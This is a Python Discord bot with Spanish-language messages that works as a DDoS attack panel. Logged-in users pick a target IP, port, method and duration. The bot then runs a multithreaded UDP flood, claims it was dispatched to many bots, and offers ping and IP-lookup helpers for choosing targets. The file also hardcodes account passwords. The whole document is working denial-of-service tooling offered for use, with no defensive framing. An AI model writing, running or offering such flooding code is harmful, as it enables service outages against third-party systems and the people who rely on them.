import discord
from discord.ext import commands
import socket
import threading
import random
import time
import platform
import subprocess

TOKEN = 'TU_TOKEN_DE_DISCORD'

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

accounts = {
    "apsx": {"password": "apsxnew", "bots": 95},
    "asky": {"password": "asky", "bots": 70}
}

logged_in_users = {}
available_methods = ["udphex", "udpraw", "tcpbypass", "udpbypass", "tcproxies"]

def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    packet_size = 2029
    data = random._urandom(packet_size)

    def send():
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (ip, port))
                s.close()
            except:
                pass

    for _ in range(100):
        threading.Thread(target=send).start()

@bot.command()
async def login(ctx, username: str, password: str):
    if username in accounts and accounts[username]["password"] == password:
        logged_in_users[ctx.author.id] = username
        await ctx.send(f"Inicio de sesión correcto como **{username}**.")
    else:
        await ctx.send("Login fallido. Usuario o contraseña incorrectos.")

@bot.command()
async def methods(ctx):
    if ctx.author.id not in logged_in_users:
        await ctx.send("No has iniciado sesión. Usa `.login <user> <pass>` primero.")
        return
    method_list = "\n".join(f"- {m}" for m in available_methods)
    await ctx.send(f"Métodos disponibles:\n{method_list}")

@bot.command()
async def bots(ctx):
    user_id = ctx.author.id
    if user_id not in logged_in_users:
        await ctx.send("Inicia sesión primero con `.login <user> <pass>`.")
        return
    username = logged_in_users[user_id]
    await ctx.send(f"{username} tiene {accounts[username]['bots']} bots disponibles.")

@bot.command()
async def ping(ctx, host: str):
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    try:
        output = subprocess.check_output(['ping', param, '1', host], universal_newlines=True)
        await ctx.send(f"Ping a {host}:\n{output}")
    except subprocess.CalledProcessError:
        await ctx.send(f"No se pudo hacer ping a {host}. Host inalcanzable.")

@bot.command()
async def hostip(ctx, hostname: str):
    try:
        ip = socket.gethostbyname(hostname)
        await ctx.send(f"La IP de {hostname} es {ip}")
    except:
        await ctx.send("Host inválido o no se pudo resolver.")

@bot.command()
async def attack(ctx, ip: str, port: int, method: str, duration: int):
    user_id = ctx.author.id
    if user_id not in logged_in_users:
        await ctx.send("Inicia sesión primero con `.login <user> <pass>`.")
        return

    if method.lower() not in available_methods:
        await ctx.send("Método inválido. Usa `.methods` para ver los métodos disponibles.")
        return

    username = logged_in_users[user_id]
    bots_count = accounts[username]["bots"]

    await ctx.send(f"> Method : {method}")
    await ctx.send(f"> Target : {ip}")
    await ctx.send(f"> Port   : {port}")
    await ctx.send(f"attack sent to {bots_count} bots")

    threading.Thread(target=udp_attack, args=(ip, port, duration)).start()

@bot.command()
async def help(ctx):
    commands_list = """
Comandos disponibles:
.login <user> <pass> - Inicia sesión
.attack <ip> <port> <method> <time> - Inicia ataque
.methods - Muestra métodos disponibles
.bots - Muestra tus bots disponibles
.ping <host> - Muestra el tiempo de ping del servidor
.hostip <hostname> - Muestra la IP del dominio
"""
    await ctx.send(commands_list)

bot.run(TOKEN)
